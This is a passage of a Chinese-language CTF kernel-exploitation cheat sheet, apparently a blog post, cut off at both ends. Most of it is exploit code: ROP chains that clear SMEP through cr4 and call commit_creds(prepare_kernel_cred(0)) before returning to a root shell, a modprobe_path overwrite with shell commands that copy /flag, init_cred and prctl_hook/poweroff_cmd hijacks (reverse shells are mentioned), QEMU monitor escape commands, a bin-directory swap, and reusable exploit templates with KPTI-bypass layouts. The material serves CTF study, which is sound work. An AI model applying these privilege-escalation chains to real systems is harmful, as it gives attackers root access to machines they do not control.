class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>




        <h2 id="2-栈"   >
          <a href="#2-栈" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-栈" class="headerlink" title="2.栈"></a>2.栈</h2>
      
        <h3 id="1-commit-creds-prepare-kernel-cred-0"   >
          <a href="#1-commit-creds-prepare-kernel-cred-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-commit-creds-prepare-kernel-cred-0" class="headerlink" title="(1)commit_creds(prepare_kernel_cred(0));"></a>(1)commit_creds(prepare_kernel_cred(0));</h3>
      <p>这个算是比较常规的栈溢出，不过还需要注意SMEP/SMAP以及KPTI是否开启</p>

        <h4 id="①开启SMEP情况"   >
          <a href="#①开启SMEP情况" class="heading-link"><i class="fas fa-link"></i></a><a href="#①开启SMEP情况" class="headerlink" title="①开启SMEP情况"></a>①开启SMEP情况</h4>
      <p>这种情况一般直接溢出然后关闭，或者知道基地址之后可以尝试在内核完成提权然后返回用户态</p>

        <h5 id="ROP关闭SMEP保护，执行用户态提权代码"   >
          <a href="#ROP关闭SMEP保护，执行用户态提权代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROP关闭SMEP保护，执行用户态提权代码" class="headerlink" title="ROP关闭SMEP保护，执行用户态提权代码"></a>ROP关闭SMEP保护，执行用户态提权代码</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      <span class="comment">// </span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = movCr4Rdi_pop_rbp_ret;  <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret; </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      			<span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>


        <h5 id="ROP在内核态提权后返回用户态起Shell"   >
          <a href="#ROP在内核态提权后返回用户态起Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#ROP在内核态提权后返回用户态起Shell" class="headerlink" title="ROP在内核态提权后返回用户态起Shell"></a>ROP在内核态提权后返回用户态起Shell</h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred_k;  </span><br><span class="line">rop[i++] = pop_rdx_rbx_rbp_ret;</span><br><span class="line">rop[i++] = pop_rbp_ret;</span><br><span class="line">rop[i++] = <span class="number">0x0</span>;      </span><br><span class="line">rop[i++] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">rop[i++] = movRdiRax_call_rdx; </span><br><span class="line">rop[i++] = commit_creds_k;</span><br><span class="line">rop[i++] = swapgs_ret;              </span><br><span class="line">rop[i++] = iretq;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②未开启SMEP情况"   >
          <a href="#②未开启SMEP情况" class="heading-link"><i class="fas fa-link"></i></a><a href="#②未开启SMEP情况" class="headerlink" title="②未开启SMEP情况"></a>②未开启SMEP情况</h4>
      <p>直接调用用户空间的提权代码，返回之后起shell即可</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret; </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>

<p>(2)</p>

        <h2 id="3-mmap内存映射"   >
          <a href="#3-mmap内存映射" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-mmap内存映射" class="headerlink" title="3.mmap内存映射"></a>3.mmap内存映射</h2>
      <p>还没看太懂，涉及文件系统和驱动的内存映射</p>
<p>可以参考<code>LINECTF-2022-ecrypt</code>，后面有提到借助kern_table数组来利用</p>

        <h2 id="4-常见提权手段"   >
          <a href="#4-常见提权手段" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-常见提权手段" class="headerlink" title="4.常见提权手段"></a>4.常见提权手段</h2>
      
        <h3 id="修改modprobe-path"   >
          <a href="#修改modprobe-path" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改modprobe-path" class="headerlink" title="修改modprobe_path"></a>修改modprobe_path</h3>
      <p>这个设方法如果开启如下配置则不可用，表示<code>modprobe_path</code>为只读，不可修改</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//v4.11及之后存在</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></div></figure>

<p>常常结合UAF漏洞来任意申请</p>
<p>starctf2019-hackme–<a href="https://pig-007.github.io/2021/08/14/starctf2019-hackme/">starctf2019-hackme | PIG-007</a></p>
<p>西湖论剑–easy_kernel–<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.crisprx.top/archives/495" >2021 西湖论剑 线上初赛 WP – Crispr –热爱技术和生活 (crisprx.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms| grep modprobe_path</span><br></pre></td></tr></table></div></figure>

<p>如果没有的话，可以先看借助<code>kallsyms</code>来<code>__request_module</code>函数的地址，然后查看该函数的汇编，获取<code>modprobe_path</code>的引用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281447847.png" alt="image-20220328144717290"></p>
<p>然后制作一个拷贝flag并且改权限的copy.sh文件，使得modprobe_path指向该文件，然后运行一个错误格式的文件，那么出错之后就会以root权限运行modprobe_path，从而以root权限运行我们的copy.sh，使得我们能够读取flag了。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(mem,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line">write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cat flag&quot;</span>);</span><br></pre></td></tr></table></div></figure>


        <h3 id="修改init-cred"   >
          <a href="#修改init-cred" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改init-cred" class="headerlink" title="修改init_cred"></a>修改init_cred</h3>
      <p>init进程是初始进程，不被动态分配，知道kernel基地址的时候，就能得到该结构体的地址。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms |grep init_cred</span><br></pre></td></tr></table></div></figure>

<p>这种方法一般用在没办法修改到本进程的cred结构体的时候，之后使用即可提权</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//pop_rdi_ret init_cred_addr commit_creds_addr即可</span></span><br><span class="line">commit_creds(&amp;init_cred)</span><br></pre></td></tr></table></div></figure>


        <h3 id="劫持prtcl-hook"   >
          <a href="#劫持prtcl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#劫持prtcl-hook" class="headerlink" title="劫持prtcl_hook"></a>劫持prtcl_hook</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://localhost:4000/2021/10/19/Kernel%E4%BB%8E0%E5%BC%80%E5%A7%8B(%E5%9B%9B)/#3-%E5%8A%AB%E6%8C%81prctl%E5%87%BD%E6%95%B0" >pwnKernel从0开始(四) | PIG-007</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prctl-&gt;security_task_prctl-&gt;prctl_hook-&gt;orderly_poweroff-&gt;__orderly_poweroff-&gt;run_cmd(poweroff_cmd)-&gt; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</span><br><span class="line"></span><br><span class="line">prctl-&gt;security_task_prctl-&gt;prctl_hook-&gt;poweroff_work_fun-&gt;run_cmd(poweroff_cmd)-&gt; call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC)</span><br></pre></td></tr></table></div></figure>


        <h4 id="1-劫持为orderly-poweroff函数"   >
          <a href="#1-劫持为orderly-poweroff函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-劫持为orderly-poweroff函数" class="headerlink" title="(1)劫持为orderly_poweroff函数"></a>(1)劫持为orderly_poweroff函数</h4>
      <p>劫持该hook为orderly_poweroff函数，然后调用prctl函数即可操纵程序流进入<code>orderly_poweroff</code>函数，再劫持<code>poweroff_cmd</code>即可顺着<code>orderly_poweroff</code>函数来运行<code>call_usermodehelper(poweroff_cmd)</code>，该函数是以root权限运行，所以能够直接提权，不过一般运行一个反弹shell的程序。当然如果有KASLR就要爆破或者泄露了。</p>
<p>最后需要执行<code>prctl(0,0)</code>；</p>

        <h4 id="2-劫持为poweroff-work-fun函数"   >
          <a href="#2-劫持为poweroff-work-fun函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-劫持为poweroff-work-fun函数" class="headerlink" title="(2)劫持为poweroff_work_fun函数"></a>(2)劫持为poweroff_work_fun函数</h4>
      <p>与劫持<code>orderly_poweroff</code>函数同理，劫持为<code>poweroff_work_fun</code>函数也可以以root权限执行<code>poweroff_cmd</code></p>

        <h4 id="3-获取地址"   >
          <a href="#3-获取地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-获取地址" class="headerlink" title="(3)获取地址"></a>(3)获取地址</h4>
      
        <h5 id="①prctl-hook"   >
          <a href="#①prctl-hook" class="heading-link"><i class="fas fa-link"></i></a><a href="#①prctl-hook" class="headerlink" title="①prctl_hook"></a>①prctl_hook</h5>
      <p>可以通过编写一个小程序，然后给<code>security_task_prctl</code>函数下断点，运行到<code>call QWORD PTR[rbx+0x18]</code>即可看到对应的rbx+0x18上存放的地址，即可获取到<code>prct_hook_addr</code>，劫持修改即可</p>

        <h5 id="②poweroff-cmd、orderly-poweroff、poweroff-work-fun"   >
          <a href="#②poweroff-cmd、orderly-poweroff、poweroff-work-fun" class="heading-link"><i class="fas fa-link"></i></a><a href="#②poweroff-cmd、orderly-poweroff、poweroff-work-fun" class="headerlink" title="②poweroff_cmd、orderly_poweroff、poweroff_work_fun"></a>②poweroff_cmd、orderly_poweroff、poweroff_work_fun</h5>
      <p>poweroff_cmd是一个全局变量，可以直接获取地址然后修改。可以直接使用nm命令来获取，或者直接进入gdb打印即可。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247187.png" alt="image-20211021105456058"></p>
<p>此外orderly_poweroff也是一样的获取。如果无法查到，那么可以启动qemu，先设置为root权限后</p>
<p><code>cat /proc/kallsyms | grep &quot;orderly_poweroff&quot;</code>即可，或者编译一个对应版本的内核进行查询。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247302.png" alt="image-20211021105603666"></p>
<p><code>poweroff_work_fun</code>函数也是类似的获取方式</p>

        <h1 id="七、意想不到的方式"   >
          <a href="#七、意想不到的方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、意想不到的方式" class="headerlink" title="七、意想不到的方式"></a>七、意想不到的方式</h1>
      
        <h2 id="1-QEMU逃逸"   >
          <a href="#1-QEMU逃逸" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-QEMU逃逸" class="headerlink" title="1.QEMU逃逸"></a>1.QEMU逃逸</h2>
      <p>当没有关闭monitor时，可以直接ctrl+A C进去逃逸，解压rootfs.img读flag</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">migrate <span class="string">&quot;exec:cp rootfs.img /tmp &quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cd /tmp;zcat rootfs.img | cpio -idmv 1&gt;&amp;2&quot;</span></span><br><span class="line">migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">(qemu) migrate <span class="string">&quot;exec:cat /tmp/flag 1&gt;&amp;2&quot;</span></span><br><span class="line">flag&#123;test_flag&#125;qemu-system-x86_64: failed to save SaveStateEntry with id(name):)</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line">qemu-system-x86_64: Unable to write to <span class="built_in">command</span>: Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zcat rootfs.cpio | cpio -idmv 1&gt;&amp;2</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-权限及相关配置问题"   >
          <a href="#2-权限及相关配置问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-权限及相关配置问题" class="headerlink" title="2.权限及相关配置问题"></a>2.权限及相关配置问题</h2>
      <p>有的根目录或者bin目录的所有者不是root时</p>

        <h3 id="1-bin目录不为ROOT"   >
          <a href="#1-bin目录不为ROOT" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-bin目录不为ROOT" class="headerlink" title="(1)bin目录不为ROOT"></a>(1)bin目录不为ROOT</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021148186.png" alt="image-20220302114830086"></p>
<p>这样可以修改bin里面的命令，而init脚本在退出时，通常包含poweroff命令，或者umount命令，而init运行时是以root权限运行的，所以我们可以修改这些命令从而在输入exit命令调用init中在setsid剩下的命令时来直接cat flag或者获得shell</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021149995.png" alt="image-20220302114945940"></p>

        <h3 id="2-根目录不为ROOT"   >
          <a href="#2-根目录不为ROOT" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-根目录不为ROOT" class="headerlink" title="(2)根目录不为ROOT"></a>(2)根目录不为ROOT</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021152377.png" alt="image-20220302115207278"></p>
<p>那么在根目录下，虽然bin的所有者为root，但是缺可以对bin进行改名，然后我们伪造一个bin目录，里面放上我们伪造的命令，那么就可以以root权限调用这个伪造的命令了，如下为所示例子。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mv bin evil_bin</span><br><span class="line">mkdir bin</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/evil_bin/sh&quot;</span> &gt; /bin/power</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/evil_bin/sh&quot;</span> &gt;&gt; /bin/power</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="3-密码未设置"   >
          <a href="#3-密码未设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-密码未设置" class="headerlink" title="(3)密码未设置"></a>(3)密码未设置</h3>
      <p>如果root账号的密码没有设置的话，直接su即可登录到root，非预期的。</p>

        <h1 id="八、模板"   >
          <a href="#八、模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、模板" class="headerlink" title="八、模板"></a>八、模板</h1>
      
        <h2 id="1-保存状态"   >
          <a href="#1-保存状态" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-保存状态" class="headerlink" title="1.保存状态"></a>1.保存状态</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-用户态起Shell"   >
          <a href="#2-用户态起Shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-用户态起Shell" class="headerlink" title="2.用户态起Shell"></a>2.用户态起Shell</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-返回用户态"   >
          <a href="#3-返回用户态" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-返回用户态" class="headerlink" title="3.返回用户态"></a>3.返回用户态</h2>
      
        <h3 id="1-没有KPTI"   >
          <a href="#1-没有KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-没有KPTI" class="headerlink" title="(1)没有KPTI"></a>(1)没有KPTI</h3>
      <p>正常的swapgs和iretq</p>
<p>ROP布局如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">swapgs_ret</span><br><span class="line">iretq</span><br><span class="line">&amp;get_shell,</span><br><span class="line">user_cs,</span><br><span class="line">user_rflags,</span><br><span class="line">user_sp,</span><br><span class="line">user_ss</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-存在KPTI"   >
          <a href="#2-存在KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-存在KPTI" class="headerlink" title="(2)存在KPTI"></a>(2)存在KPTI</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006#h3-2" >Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>从<code>swapgs_restore_regs_and_return_to_usermode</code>函数某处开始执行</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rdi,rsp   //该处开始执行</span><br><span class="line">mov    rsp,QWORD PTR gs:0x6004</span><br></pre></td></tr></table></div></figure>

<p>ROP布局如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode+22,</span><br><span class="line">0,</span><br><span class="line">0,</span><br><span class="line">&amp;get_shell,</span><br><span class="line">user_cs,</span><br><span class="line">user_rflags,</span><br><span class="line">user_sp,</span><br><span class="line">user_ss</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-爆破KASLR"   >
          <a href="#4-爆破KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-爆破KASLR" class="headerlink" title="4.爆破KASLR"></a>4.爆破KASLR</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="1-POC里"   >
